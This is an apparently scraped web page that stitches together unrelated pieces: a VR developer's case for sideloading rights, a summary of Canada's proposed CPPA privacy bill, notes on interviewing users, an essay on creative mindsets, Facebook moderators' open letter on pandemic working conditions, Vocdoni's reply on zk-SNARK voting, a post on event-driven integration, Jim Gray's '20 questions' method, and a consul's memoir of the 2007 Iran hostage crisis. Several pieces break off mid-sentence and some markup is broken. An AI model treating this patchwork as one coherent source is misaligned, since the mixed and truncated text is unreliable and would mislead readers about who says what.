<h2 id="this-model-is-being-replicated-in-vr-and-ar">This model is being replicated in VR and AR</h2>
<p>It's no secret that I work in Virtual Reality. In fact, writing this gives me some anxiety because my company could be targeted and harmed for me saying things that don't benefit the VR headset makers. <em>But this needs to be said.</em> In fact, I'd say this is one of the most important fights in the software industry today because it will determine whether future platforms are open or closed.</p>
<p>VR headsets have already been set up to be <a href="https://searchsecurity.techtarget.com/definition/walled-garden" target="_blank" rel="nofollow noopener noreferrer">walled gardens</a>, and although Oculus has turned a blind eye for the time being to third party app stores like <a href="https://sidequestvr.com/" target="_blank" rel="nofollow noopener noreferrer">SideQuest</a>, they could still decide to cut it off at any point in the future with little or no recourse.</p>
<p>Whether third party app stores are the solution also remains to be seen, but gauging by how difficult device makers make it for average users to install them, and what little percentage market share they have on each respective platform, I'd say they don't go far enough to solve this problem.</p>
<p>The ability to easily <a href="https://en.wikipedia.org/wiki/Sideloading" target="_blank" rel="nofollow noopener noreferrer">sideload</a>, aka install software directly onto a device that you own and not through any given app store, is paramount to maintaining free access to today's as well as tomorrow's computing platforms. And we should have the ability to do so without navigating a maze of warnings discouraging the average user from doing so.</p>
<h2 id="pcs-will-become-headsets-which-are-general-computing-devices">PCs will become headsets, which are general computing devices</h2>
<p>Augmented Reality is still in its infancy and isn't a general computing platform yet, not because it's specialized but because the technology isn't of sufficient quality yet. But it's improving rapidly, and one day it will be good enough to overtake both PCs and phones as the dominant computing platform of the future.</p>
<p>When it does, it will be critical to indie developers everywhere that we maintain the same level of freedom on these future platforms that we enjoy today on PCs, and stop the current erosion of those freedoms by big tech companies. Failure to do so will close off all software that isn't blessed by device makers, which will further increase the financial divide between indie developers and the companies who will control the platforms of the future, whether that's Apple, Google, Microsoft, or Facebook. <em>We can't let that happen.</em></p>
<h2 id="whats-the-solution">What's the solution?</h2>
<p>The solution is simple and threefold:</p>
<ol>
<li>Mobile phones and headset-based computing devices should be classified as general computing platforms in the eyes of the law.</li>
<li>General computing platforms should have the legal requirement that developers can distribute their software however they see fit, so long as it doesn't harm users (malware, spyware, etc.).</li>
<li>Choice of payment processors should not be forced on developers in exchange for the ability to distribute software on any general computing platform.</li>
</ol>
<p>Only when the above rights have been won in the eyes of the law will our fight be over on this front, but there will always be other …</p></div></div></div></div></div>

      <!--<div>-->
              
            <p>Canada’s privacy legislation is about to go through major changes. Earlier today, the Minister of Innovation, Science and Industry, Navdeep Bains, introduced a <a href="https://parl.ca/DocumentViewer/en/43-2/bill/C-11/first-reading">bill</a> for the replacement of Canada’s federal privacy legislation for the private sector (the <em>Personal Information Protection and Electronic Documents Act</em> or “<strong>PIPEDA</strong>”) with the new <em>Consumer Privacy Protection Act</em> (“<strong>CPPA</strong>”) and the <em>Personal Information and Data Protection Tribunal Act </em>(“<strong>PIDPT</strong>”). The new regime draws inspiration from PIPEDA, including the Model Code principles, guidance from the Office of the Privacy Commissioner of Canada (the “<strong>Commissioner</strong>”), and the European Union’s General Data Protection Regulation (“<strong>GDPR</strong>”).</p>

<p>Key changes introduced by the CPPA and PIDPT include:</p>

<ul>
	<li>
	<p><strong>A New Tribunal that can Impose Significant Penalties and Fines </strong>– Organizations that violate the CPPA can face administrative monetary penalties of up to the greater $10,000,000 and 3% of the organization’s gross global revenue, and organizations that knowingly commit certain offences under the CPPA can face fines up to the greater of $25,000,000 and 5% of the organization’s gross global revenue. However, penalties will not be issued by the Commissioner. The Commissioner will instead recommend penalties to the Personal Information and Data Protection Tribunal (the “<strong>Tribunal</strong>”), which has the right to impose penalties. Other orders of the Commissioner can be appealed to the Tribunal.</p>
	</li>
	<li>
	<p><strong>Private Right of Action</strong> –The CPPA contains a private right of action for individuals. Before an individual can make a claim, the organization must have been convicted of an offence under the CPPA or there must be a final determination by the Commissioner or the Tribunal that the organization contravened the CPPA. The individual can claim damages for loss or injury that the individual has suffered as a result of the offence or contravention. It appears that an organization could be subject to the maximum administrative monetary penalty and still face claims under the private right of action.</p>
	</li>
	<li>
	<p><strong>Enhanced Consent </strong>– In order to obtain valid consent, an organization must provide certain information to the individual at or before the time of collection (or before the use or disclosure when seeking consent regarding personal information already in the organization’s custody). The information that organizations must provide includes the purpose(s) of the collection, use and disclosure, the “reasonably foreseeable consequences of the collection, use or disclosure”, the types of personal information involved, and the “names of any third parties or types of third parties to which the organization may disclose the personal information”. Implied consent will be acceptable in certain circumstances, taking into account the individual’s reasonable expectations and the sensitivity of the personal information.</p>
	</li>
	<li>
	<p><strong>New Grounds of Processing without Consent </strong>– Like the GDPR, the CPPA permits organizations to lawfully collect, use and disclose personal information without consent for other valid reasons, including as necessary to provide a product or service requested by an individual, as part of due diligence to prevent or manage commercial risk, for security and safety purposes, and where obtaining consent would be impracticable due to the lack of a direct relationship. However, organizations must only do so where a reasonable person would expect it and may not do so for the purpose of influencing the individual’s behavior or decisions.</p>
	</li>
	<li>
	<p><strong>Enhanced Rights of Individuals</strong> – Individuals will have the right to data portability (the right to obtain their personal information in a useable format from an organization), the right of erasure (the limited right to have their personal information deleted by an organization) and other new privacy rights, all subject to some prescribed limitations. In the case of data portability, the right will be subject to the applicability of a data mobility framework under the yet-to-be-published regulations.</p>
	</li>
	<li>
	<p><strong>Transparency Regarding Trans Border Transfers</strong> – The CPPA permits organizations to store and access personal information outside of Canada, but it does require that organizations make information available about “whether or not the organization carries out any international or interprovincial transfer or disclosure of personal information that may have reasonably foreseeable privacy implications”.</p>
	</li>
	<li>
	<p><strong>AI/Automated Decision Systems</strong> – The CPPA introduces the concept of “automated decision systems”, which is “technology that assists or replaces the judgment of human decision-makers using techniques such as rules-based systems, regression analysis, predictive analytics, machine learning, deep learning and neural nets.” As part of the openness and transparency requirements, organizations need to provide a “general account” of their “use of any automated decision system to make predictions, recommendations or decisions about individuals that could have significant impacts on them”. Individuals also have a right to “an explanation of the prediction, recommendation or decision and of how the personal information that was used to make the prediction, recommendation or decision was obtained.”</p>
	</li>
	<li>
	<p><strong>De-Identification of Personal Information </strong>– The CPPA provides an express right to use personal information without an individual’s knowledge or consent to de-identify the information. While specific requirements are not stipulated, the CPPA states that the organization “must ensure that any technical and administrative measures applied to the information are proportionate to the purpose for which the information is de-identified and the sensitivity of the personal information”. Further, the proposed law includes a prohibition on using de-identified information, alone or in combination with other information, to identify an individual.</p>
	</li>
</ul>

<p>At this stage, the bill to enact the CPPA, PIDPT and the other related legislative amendments is at first reading. It will likely go to second reading and then to a committee for further study and amendment.</p>

<p><strong>Sources of Inspiration</strong></p>

<p>This new regime must be viewed through a long lens of legislative history, including the federal government’s introduction of a <a href="https://www.mccarthy.ca/en/insights/blogs/snipits/canadian-government-announces-new-digital-charter">Digital Charter</a> seeking to promote the digital economy while addressing its privacy and AI-related challenges, the GDPR-focused parliamentary committee report,&nbsp;<a href="https://www.mccarthy.ca/en/insights/blogs/snipits/parliamentary-committee-recommends-substantial-revisions-pipeda-part-1-overview-and-context">Towards Privacy by Design</a>,&nbsp;and the consultation,&nbsp;<a href="https://www.ic.gc.ca/eic/site/062.nsf/eng/h_00107.html">Strengthening Privacy for the Digital Age</a>, which explains some of what animates the CPPA and PIDPT. Key briefs and oral testimony of witnesses are available <a href="https://www.ourcommons.ca/Committees/en/ETHI/StudyActivity?studyActivityId=9213226">here</a>. The background also includes position papers and recommendations from the Commissioner, such as the November 12, 2020 position paper, <a href="https://www.priv.gc.ca/en/about-the-opc/what-we-do/consultations/completed-consultations/consultation-ai/reg-fw_202011/">A Regulatory Framework for AI</a> (explicitly aimed at providing “Recommendations for PIPEDA Reform”), and the <a href="https://www.priv.gc.ca/en/about-the-opc/what-we-do/consultations/completed-consultations/consultation-on-transfers-for-processing/">Consultations on Transfers for Processing</a> and <a href="https://www.priv.gc.ca/en/privacy-topics/collecting-personal-information/consent/gl_omc_201805/">Guidelines for Obtaining Meaningful Consent</a>.</p>

<p>What also remains to be seen is how the new federal legislation will interact with provincial legislation. While&nbsp;<a href="https://www.mccarthy.ca/en/insights/blogs/techlex/bill-64-overhaul-quebecs-privacy-law-regime-implications-business">Quebec is the furthest along in reforming its legislation</a>,&nbsp;<a href="https://www.ontario.ca/page/consultation-strengthening-privacy-protections-ontario">Ontario recently closed its consultation on producing its own law</a>, Alberta recently proposed&nbsp;<a href="https://www.assembly.ab.ca/assembly-business/bills/bill?billinfoid=11885&amp;from=bills">amendments to its&nbsp;<em>Health Information Act</em></a>, and British Columbia recently dissolved a&nbsp;<a href="https://www.mccarthy.ca/en/insights/blogs/techlex/special-committee-begins-consultations-changes-bcs-personal-information-protection-act">special committee considering changes to the&nbsp;<em>Personal Information Protection Act</em></a> for an election. Harmonizing these various draft bills will be a complex but important undertaking in the time to come.</p>

<p><strong>What Organizations Should Do Now</strong></p>

<ul>
	<li>
	<p><strong>Stay Aware of Changes </strong>– In the coming weeks and months, members of our<a href="https://www.mccarthy.ca/en/services/cyberdata/cyberdata"> Cyber/Data Group</a> will be publishing posts exploring the proposed law in depth. We will cover the topics above, as well as other topics that are relevant to organizations operating in Canada or otherwise processing the personal information of Canadian residents. We will also provide updates as the draft legislation moves through various stages.</p>
	</li>
	<li>
	<p><strong>Prepare for the Changes </strong>– While the Minister suggested there will be a transition period, it is unclear how long the transition period will be. There is a substantial list of new obligations, including with respect to privacy notices, policies and procedures, record retention, and accommodating individual rights.</p>
	</li>
	<li>
	<p><strong>Prepare for Consultations</strong> – Organizations should be considering the impact the legislation will have on them and, if appropriate, the value of advocating for improvements and clarifications.</p>
	</li>
</ul>

<li><span>You may have heard the saying, “God gave you two ears and one mouth for a reason.”&nbsp;</span>
<ul>
<li><span>“In startups, how many problems could be discovered if we spoke less and listened more to our users. You can’t offer solutions until you know what is the problem.” — Holly Liu</span></li>
</ul>
</li>
<li><span>When talking to users, avoid “would” questions. People are bad at predicting what they would do in the future. Asking about the past is better and draws out more specifics.</span></li>
<li><span>Because you want to encourage users to talk more, asking open-ended questions helps accomplish that.&nbsp;</span></li>
<li><span>“People will tell you anything, but what they DO is more important.” — Holly Liu</span>
<ul>
<li><span>In a pandemic especially, it’s important to have users show you their screen to see how they interact with your product. Obviously, with a physical product, it may be a bit different.&nbsp;</span></li>
<li><span>Always ask if you’re able to record the session. Permission is the most important part. These recordings can be used to help with collaboration amongst your team or for reference when tweaking/building your product.</span></li>
</ul>
</li>
<li><span>“Avoid talking about your solution. In order to find as much as possible without influence, it would be better for you to not talk about what you are building…Otherwise, you will arrive at the same conclusion as Henry Ford, ‘If I asked my users what they wanted, they would say they want a faster horse’ and render a useless solution.” — Holly Liu</span></li>

								<p><span>Talking to your users can be messy. To limit the messiness of it, put processes in place to filter the complexities. The conversation/viewing itself seems a bit daunting, but after reading Holly’s piece, it seems like you can’t go wrong with listening more than you talk and asking open-ended questions. And asking permission to record, don’t forget! </span></p>

<p>As a creator, you’ll need to wear different hats depending on the problem at hand. Today I want to introduce you to two of my favorite creative mindsets.</p>



<p><strong>The DJ’s Mindset</strong></p>



<figure><img src="https://images.unsplash.com/photo-1601418059872-2ac6d694946d?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1030&amp;q=80" alt=""><figcaption><em>Picture by <a href="https://unsplash.com/@samvbussel" target="_blank" rel="noreferrer noopener">@samvbussel</a></em></figcaption></figure>



<p>DJs operate under a powerful creative principle: remixing. They curate existing music and records, and combine them to create a brand-new piece.</p>



<p>But you can apply this principle far beyond music. You can use it in business, design, writing, architecture, fashion, and all sorts of creative endeavors.&nbsp;</p>



<p>DJs understand that few things are truly original — most new ideas are a combination of two old ones. By remixing, they leverage the work put into existing things to create more value.</p>



<p><strong>The Chef’s Mindset</strong></p>



<figure><img src="https://images.unsplash.com/photo-1577106263724-2c8e03bfe9cf?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1050&amp;q=80" alt=""><figcaption><em>Picture by <a href="https://unsplash.com/@sebastiancoman" target="_blank" rel="noreferrer noopener">@sebastiancoman</a></em></figcaption></figure>



<p>People often use the words “chef” and “cook” as synonyms, when in reality they couldn’t be more different.</p>



<p>Cooks are operators. They follow instructions. Chefs, on the other hand, are first-principle thinkers. They are the ones creating new recipes from scratch. Some of them even reinvent the whole dining experience.</p>



<p>To think like a chef you need to ask tons of questions, and challenge long-held beliefs and assumptions. After carefully deconstructing the status quo, you can find more elegant, simple or efficient alternatives.</p>


<p><em>This piece is part of a series of 30 atomic essays where I explore what it means to be a&nbsp;<a href="https://rationalcreatives.substack.com/" target="_blank" rel="noreferrer noopener">rational creative</a>&nbsp;and the different aspects of being a creator online.

Here is the full text of an open letter which over 200 Facebook content moderators from across the world have just addressed to Facebook’s leaders:</em></p><p><strong>November 2020</strong></p><p><strong>Mark Zuckerberg <br>Sheryl Sandberg <br>Anne Heraty (CEO, CPL/Covalen) <br>Julie Sweet (CEO, Accenture) <p>Via email and posting on Facebook’s Workplace channels </p></strong></p><div><p><strong>Open letter from content moderators re: pandemic <br></strong><br>Dear Mr. Zuckerberg, Ms. Sandberg, Ms. Heraty, Ms. Sweet </p><p>We, the undersigned Facebook content moderators and Facebook employees, write to express our dismay at your decision to risk our lives—and the lives of our colleagues and loved ones—to maintain Facebook’s profits during the pandemic. </p></div><p>After months of allowing content moderators to work from home, faced with intense pressure to keep Facebook free of hate and disinformation, you have forced us back to the office. Moderators who secure a doctors’ note about a personal COVID risk have been excused from attending in person.[1] Moderators with vulnerable relatives, who might die were they to contract COVID from us, have not. </p><p>The pandemic has been good for Facebook. More than 3 billion people have now joined Facebook services, creating more demand for our work than ever.[2] Mr. Zuckerberg nearly doubled his fortune during the crisis.[3] He is now worth well over $100 billion. It has been good for Facebook’s contractors, too: CPL, one of the main European contractors, is due to be sold for €318m.[4] </p><p>Despite vast sums flowing to each of you as corporate executives, you have refused moderators hazard pay. A content moderator at Accenture’s office in Austin, Texas generally earns $18/hour[5]. </p><p>Before the pandemic, content moderation was easily Facebook’s most brutal job. We waded through violence and child abuse for hours on end. Moderators working on child abuse content had targets increased during the pandemic, with no additional support. </p><p>Now, on top of work that is psychologically toxic, holding onto the job means walking into a hot zone. In several offices, multiple COVID cases have occurred on the floor.[6] Workers have asked Facebook leadership, and the leadership of your outsourcing firms like Accenture and CPL, to take urgent steps to protect us and value our work. You refused. We are publishing this letter because we are left with no choice. </p><p>Stop Needlessly Risking Moderators’ Lives </p><p>It is important to explain that the reason you have chosen to risk our lives is that this year Facebook tried using ‘AI’ to moderate content—and failed.[7] </p><p>At the start of the pandemic, both full-time Facebook staff and content moderators worked from home. To cover the pressing need to moderate the masses of violence, hate, terrorism, child abuse, and other horrors that we fight for you every day, you sought to substitute our work with the work of a machine. </p><p>Without informing the public, Facebook undertook a massive live experiment in heavily automated content moderation. Management told moderators that we should no longer see certain varieties of toxic content coming up in the review tool from which we work— such as graphic violence or child abuse, for example. </p><p>The AI wasn’t up to the job. Important speech got swept into the maw of the Facebook filter—and risky content, like self-harm, stayed up. </p><p>The lesson is clear. Facebook’s algorithms are years away from achieving the necessary level of sophistication to moderate content automatically. They may never get there. </p><p>This raises a stark question. If our work is so core to Facebook’s business that you will ask us to risk our lives in the name of Facebook’s community—and profit—are we not, in fact, the heart of your company? </p><p>Without our work, Facebook is unusable. Its empire collapses. Your algorithms cannot spot satire. They cannot sift journalism from disinformation. They cannot respond quickly enough to self-harm or child abuse. We can. </p><p>Facebook needs us. It is time that you acknowledged this and valued our work. To sacrifice our health and safety for profit is immoral. </p><p>These are our demands. </p><p>1. Keep moderators and their families safe. At the moment, only individual content moderators with a doctors’ note indicating that they are high risk are excused from working in the office. Even this is not offered in some workplaces. Those who live with an at-risk person – who have, for example, a child with epilepsy – have been forced to come in. All content moderators who are high risk or who live with someone who is high risk for Covid should be permitted to work from home indefinitely. </p><p>2. Maximize at-home working. Work that can be done from home should continue to be done from home. You have previously said content moderation cannot be performed remotely for security reasons. If that is so, it is time to fundamentally change the way that the work is organized. There is a pervasive and needlessly secretive culture at Facebook. Some content, such as content that is criminal, may need to be moderated in Facebook offices. The rest should be done at home. </p><p>3. Offer hazard pay. If you want moderators to risk their lives to maintain ‘community’ and profit, you should pay. Moderators who are working in the office on high-risk material (eg, child abuse) should be paid hazard pay of 1.5x their usual wage. </p><p>4. End outsourcing. There is, if anything, more clamor than ever for aggressive content moderation at Facebook. This requires our work. Facebook should bring the content moderation workforce in house, giving us the same rights and benefits as full Facebook staff. </p><p>5. Offer real healthcare and psychiatric care. Facebook employees enjoy various benefits, including private health insurance and visits to psychiatrists. Content moderators, who bear the brunt of the mental health trauma associated with Facebook’s toxic content, are offered 45 minutes a week with a ‘wellness coach’. These ‘coaches’ are generally not psychologists or psychiatrists and are contractually forbidden from diagnosis or treatment. And they generally cannot build a relationship of trust with moderators, since workers know that Facebook management (and Accenture/CPL management) ask ‘coaches’ to reveal confidential details of counselling sessions. Moderators deserve at least as much mental and physical health support as full Facebook staff. </p><p>The current crisis highlights that at the core of Facebook’s business lies a deep hypocrisy. By outsourcing our jobs, Facebook implies that the 35,000 of us who work in moderation are somehow peripheral to social media. Yet we are so integral to Facebook’s viability that we must risk our lives to come into work. </p><p>It is time to reorganize Facebook’s moderation work on the basis of equality and justice. We are the core of Facebook’s business. We deserve the rights and benefits of full Facebook staff. We look forward to your public response. </p><p>Very sincerely yours, </p><ul data-rte-list="default"><li><p>Andrea</p></li><li><p>Angela De Hoyos Hart</p></li><li><p>Ani Niow</p></li><li><p>Audrey Martin</p></li><li><p>Aune Mitchell</p></li><li><p>Azer Gueco</p></li><li><p>Baris Aytan</p></li><li><p>Brady Bennett</p></li><li><p>Cam Herringshaw</p></li><li><p>Carlin Scrudato</p></li><li><p>Carlos Ancira</p></li><li><p>Charles Maxwell</p></li><li><p>Chris Chan</p></li><li><p>Christopher Glenn</p></li><li><p>Claire Sexton</p></li><li><p>Crystal Chan</p></li><li><p>Danica Michaels</p></li><li><p>Daniel Baxley</p></li><li><p>Daniel Finlayson</p></li><li><p>Daniel Rezende Fuser</p></li><li><p>Danille Sindac</p></li><li><p>Diego Ramirez</p></li><li><p>Dominick Martinez</p></li><li><p>Douglas Hart</p></li><li><p>Erin Donohue</p></li><li><p>Fletcher West</p></li><li><p>Hua Hoai Nam</p></li><li><p>James J.

                        <p>‌</p><blockquote> The following text is an open letter from Pau Escrich and the rest of the Vocdoni Team to <code>"Going from Bad to Worse: From Internet Voting to Blockchain Voting"</code> draft paper published on November 6th, 2020 by The Digital Currency Initiative of MIT Medialab.<br>Retrieve it here: <a href="https://people.csail.mit.edu/rivest/pubs/PSNR20.pdf">https://people.csail.mit.edu/rivest/pubs/PSNR20.pdf</a></blockquote><p>Dear Neha, Sunoo, Michael, Ronald,</p><p>Vocdoni is a Free and Libre open source project building a digital voting infrastructure that is universally verifiable, decentralized, scalable and anonymous.</p><p>This project represents a new paradigm for digital voting as compared to existing solutions which rely solely on a blockchain for vote traceability, employ closed-source software and even operate as a centralized service.</p><p>When reading your recent paper [1], we found that it addresses many of the very important problems and challenges that many e-voting solutions have. We believe, however, that the paper is missing some recent and crucial developments to the field of digital voting, such as those proposed by Vocdoni.</p><p>We have designed a decentralized voting platform [2] that is not only attack-resistant and universally-verifiable but also enables voter anonymity with the use of zk-SNARKs technology. We believe our design would solve some of the most important problems listed in the paper.</p><p>Regarding Zero Knowledge, the paper states the following:</p><blockquote>First, a digital-only solution does nothing to prevent physical monitoring by coercers or vote buyers. Secondly, zero-knowledge proofs are designed for a setting where the party with secret information wants to keep it secret (that’s why they’re using zero-knowledge proofs) — they generally do not prevent that party from revealing information voluntarily.</blockquote><p>At Vocdoni we are working on a series of developments that overcome these concerns.</p><p>In its current development stage, our system anonymizes voters' census inclusion proofs which are submitted with their votes. The content of each vote, however, is still publicly available and verifiable. This means the choices on each ballot can be known, but an outsider cannot link this ballot to any individual voter. (It's important to note that, in addition to the vote anonymity, the sense of the vote might be temporarily encrypted with a set of cryptographic keys revealed at the end of the election).</p><p>With regards to coercion attacks, our current zk-SNARKs circuit [3] already reduces the attack surface by leveraging the following methods:</p><ol><li>When an election ends, a set of keys (commit and reveal keys in the circuit schema) is revealed by multiple trusted parties. Using these keys, anyone can generate a valid ZK-proof, which would be indistinguishable from a legitimate voter's proof. This secondary proof could only be used to manipulate an election in the case that all trusted keyholding parties collaborated maliciously.</li><li>During an election, users can replace their vote as many times as they wish.</li></ol><p>These measures do not altogether rule out the possibility of an attack; before the election ends, a user could still exhibit their vote to a third party in exchange for a bounty. A buyer would need this user to prove that their vote is associated with a given nullifier on the Vochain. Such a vote-buying system would be complex, but feasible, to scale.</p><p>In order to achieve complete anti-coercion while keeping our design principles, we visualize two possile schemes for digital vote anonymity in the not-so-distant future:</p><h3 id="zk-rollups">Zk-Rollups</h3><p>As ZK-Rollups become computationally viable, they could also be used to achieve ballot content anonymization.</p><p>In this scenario a voter would send their vote to a private network rather than a public Blockchain. A private ZK-Rollup service(s) connected to this network would aggregate user ZK-Proofs and votes, and compute a valid cryptographic proof to verify:</p><ul><li>the list of vote nullifiers</li><li>the election Process identifier</li><li>the census Root Hash</li><li>the results of the vote batch</li></ul><p>The ZK-Rollup proof would then be sent to a public ledger containing the batch data. Any voter would be able to validate the inclusion of their vote by querying their own nullifier. The individual ballot's content would never be publicly available, but the result (computed inside the zk-SNARKs circuit) would be verifiable (otherwise the ZK-Proof would be invalid).</p><p>More details on the ZK-Rollup proposal can be found here [4].</p><h3 id="homomorphic-encryption">Homomorphic encryption</h3><p>Another alternative would be the use of homomorphic encryption on top of zk-SNARKs, anonymizing the vote content in addition to the already anonymized census inclusion proof.</p><p>In this scenario, the content of a ballot would be encrypted and directly added to the last currently encrypted result aggregation (without decrypting). Some homomorphic schemas also allow for verification that an encrypted ballot is valid for a set of rules (i.e not larger than N).</p><p>These are only small pieces of the paradigm shift we're trying to trigger for digital voting. If you feel engaged by following the discussion with us, we would be delighted to continue the conversation.</p><p>[1] <a href="https://people.csail.mit.edu/rivest/pubs/PSNR20.pdf">https://people.csail.mit.edu/rivest/pubs/PSNR20.pdf</a><br>‌‌[2] <a href="https://docs.vocdoni.io/">https://docs.vocdoni.io</a>‌‌<br>[3] <a href="https://docs.vocdoni.io/#/architecture/protocol/franchise-proof">https://docs.vocdoni.io/#/architecture/protocol/franchise-proof</a><br>‌‌[4] <a href="https://docs.vocdoni.io/#/architecture/protocol/franchise-proof?id=zk-rollups-proposal-for-anti-coercion-scalable-and-deterministic-execution">https://docs.vocdoni.io/#/architecture/protocol/franchise-proof?id=zk-rollups-proposal-for-anti-coercion-scalable-and-deterministic-execution</a></p><hr><p>To join the conversation and know more about Vocdoni <a href="https://docs.vocdoni.io/">check our Technical Architecture</a>, follow us on <a href="https://twitter.com/vocdoni">Twitter</a> and <a href="http://discord.gg/sQCxgYs">join our Discord Server</a>.</p>

						How Moving From Batch To Real Time Improves The Customer Experience	</h2>
						
<p>Over time, the typical business acquires more and more applications. Some will be bespoke, some off the shelf, some cloud hosted SaaS tools and some in the data centre.</p>



<p>Frequently, business requirements will arise where these applications need to be integrated. For instance, every time an order is placed on our eCommerce website, a customer record should be created in the CRM system, the marketing system, and the ERP system.</p>



<p>As companies add more and more of these integrations, they end up with a spaghetti of bespoke interconnections and data exchanges which looks something like this:</p>



<figure><img loading="lazy" width="1024" height="846" src="https://timeflow.systems/wp-content/uploads/2020/09/map-1024x846.png" alt="" srcset="https://timeflow.systems/wp-content/uploads/2020/09/map-1024x846.png 1024w, https://timeflow.systems/wp-content/uploads/2020/09/map-300x248.png 300w, https://timeflow.systems/wp-content/uploads/2020/09/map-768x634.png 768w, https://timeflow.systems/wp-content/uploads/2020/09/map.png 1057w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>These integration points have historically been developed in one of three ways:</p>



<ol><li>API Integration – When the e-commerce system records a new customer, the ERP and marketing systems are called in real time to create the record. This is the gold standard for moving data around in real time, but it does couple the systems together very tightly, so we have to worry about keeping APIs compatible so that we do not break upstream and downstream systems.</li><li>Batch Data Integration – Because of the complexity and effort involved in developing and managing point to point APIs, most information is exchanged between applications as batches. Every 24 hours or so, information is extracted from one system, uploaded to another as a data file, and imported into the destination. This is referred to as extract, transform and load.</li><li>Message Based Integration – As things happen in the source system, messages are transferred from the source to destination over an intermediary message queue. This is almost real time, and does decouple the systems somewhat, so is probably the optimal solution as of today, though it does have implications for how your source and destination systems are designed and built.</li></ol>



<p>Though event based architecture and messaging platforms such as Kafka are the solution to this mess, the problem is that most businesses are built on batch integration and unreliable point to point APIs. Though it’s hard to know, I would say the split is 70% batch, 20% point to point APIs and 10% messaging in the large enterprises that I am familiar with.</p>



<p>The problem is that when we run too many integration jobs with delayed and unreliable foundations, this leaks through to impact the customer experience. Take these frustrating interactions with your bank for instance:</p>



<ul><li>Online banking being slow to update as you make transactions;</li><li>Delays before a requested statement is sent out or a letter issued;</li><li>Delays in opening accounts and being onboarded as a customer;</li><li>Being passed between different call centre departments and having to explain your request over again;</li></ul>



<p>Slow and unreliable batch data exchange is likely to be at the heart of these frustrating experiences.</p>



<p>Now compare this to the Neo Banks who have experiences such as the below, where push notifications arrive on your phone the instant you swipe your debit card in a store:</p>



<p>This shows that the payment event is instantly flowing through the system and immediately enhancing the user experience with no batch processing. This still makes me smile now as I know the amount of technology required to make it happen. I think the fact that startup banks can do this seemingly simple thing should be concerning for the incumbents as it demonstrates that they are built on real time foundations.</p>



<p>To build these user experiences, companies need to implement an event driven architecture and move away from batch integration, point to point APIs towards real time streaming. This does go deeper than just modernising how you implement your applications, as discussed in this video.</p>

</p></figure>



<p>I believe that the move to event driven architectures and real time messaging are absolutely at the heart of the transformation that enterprises need to make. If we are building on batch integration, it is very hard to build personalised and responsive customer experiences, and hard to introduce intelligent automation and proactive use of data into business processes.</p>

    <div><div><div><p><a href="http://research.microsoft.com/~Gray/">Jim Gray</a>, a Turing award winning computer science researcher at Microsoft Research, has used a "20 questions" methodology to gather data management requirements from scientists in <a href="http://www.sdss.org/">Astronomy</a>, <a href="http://lifeunderyourfeet.org/en/default.asp">Ecology</a>, <a href="http://research.microsoft.com/research/pubs/view.aspx?msr_tr_id=MSR-TR-2005-49">Materials Engineering</a>, and <a href="http://research.microsoft.com/~Gray/">more</a>.  Each of these efforts led to very successful projects.</p>
<p>The idea is this:  You all, collectively, provide 20 science questions about your data that are difficult or cumbersome to answer using existing software.  I take those 20 questions and your data and design an online system that can answer each one.</p>
<p>For example, for the Sloan Digital Sky Survey project, the astronomers provided the following questions about their telescope data (among others):</p>
<ol>
<li>Find all galaxies without unsaturated pixels within 1' of a given point of ra=75.327, dec=21.023</li>
<li> Find all galaxies with blue surface brightness between and 23 and 25 mag per square arcseconds, and -10<super galactic="" latitude="" (sgb)="" <10,="" and="" declination="" less="" than="" zero.<="" li="">
</super></li><li>Find all galaxies brighter than magnitude 22, where the local extinction is &gt;0.75. </li>
<li>Find galaxies with an isophotal surface brightness (SB) larger than 24 in the red band, with an ellipticity&gt;0.5, and with the major axis of the ellipse having a declination of between 30” and 60”arc seconds.</li>
<li> Find all galaxies with a deVaucouleours profile (r¼ falloff of intensity on disk) and the photometric colors consistent with an elliptical galaxy.  The deVaucouleours profile </li>
<li>Find galaxies that are blended with a star, output the deblended galaxy magnitudes. </li>
<li> Provide a list of star-like objects that are 1% rare.</li>
<li> Find all objects with unclassified spectra. </li>
<li> Find quasars with a line width &gt;2000 km/s and 2.5<redshift<2.7. <="" li="">
</redshift<2.7.></li><li> Find galaxies with spectra that have an equivalent width in Ha &gt;40Å (Ha is the main hydrogen spectral line.) </li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><strong>Royal Navy Hostages In Iran</strong>– <strong>What Really Happened</strong> is an event that at the time in 2007 was global news. From my perspective as Her Majesty’s Consul to Iran at the time, it was a hopelessly frustrating and humiliating experience. As a proud maritime nation, it was also not exactly one of our finest moments.</p><p>Now I had a saying at the time that whenever the Iranians got twitchy or felt threatened, they would take hostages. They had form for this and in this case they didn’t let me down.</p><p>In fact this 2007 incident was not the first time they had detained British military personnel.</p><p>In June 2004, three small vessels and eight<strong> Royal Navy</strong> personnel were detained by Iranian forces after they allegedly entered Iranian waters on the Shatt al-Arab river without permission. At the time, the story was broken when the capture was announced on state-run Iranian television. British officials only stated that they had “lost contact” with the boats, before confirming their detention.</p><p>On that occasion the men were later released unharmed, but only after being paraded blindfolded on Iranian TV and made to apologise for their role in the incident. The equipment was not returned.</p><p>So now fast forward to Friday March 23rd 2007:</p><p>Fifteen British Royal Navy and Royal Marine personnel were captured by Iranian authorities, more specifically the Iranian Revolutionary Guard Corps (IRGC) at gunpoint in the Persian Gulf just off the Iraqi coast that morning.</p><p>The Royal Navy insisted that they were operating legitimately in Iraqi waters the Iranians said they were in fact in Iranian waters. This inside/outside argument went on for the duration and long after the crisis with both sides providing information showing they were in the right.</p><p>Geographically, the incident occurred near the Shatt al-Arab (Arvandrud) waterway, which forms the southern border between Iran and Iraq. Territorial and navigational control over the waterway has been a constant source of friction between the two countries that helped to spark the Iran-Iraq war in the 1980s.</p><p>What is not disputed is the fact that the sailors and marines, from the Type 22 frigate HMS <i>Cornwall</i>, had been inspecting, in accordance with UN Security Council Resolution 1723, a ship that was believed to be smuggling cars into Iraq, though it was subsequently cleared by the boarding team after inspection.</p><p>The Ministry of Defence reiterated this by putting out a bulletin late in the day stating that the Royal Navy personnel had been <i>“engaged in routine boarding operations of merchant shipping in Iraqi territorial waters”</i> and had finished their search of the suspect vessel when they were surrounded by Iranian forces and taken into captivity</p><p>My first inkling of this event was seeing it at home on Iranian TV that same evening!</p><p>Needless to say my phone started ringing and I was summoned to the embassy for a crisis meet with the Ambassador and other colleagues from the political and public affairs 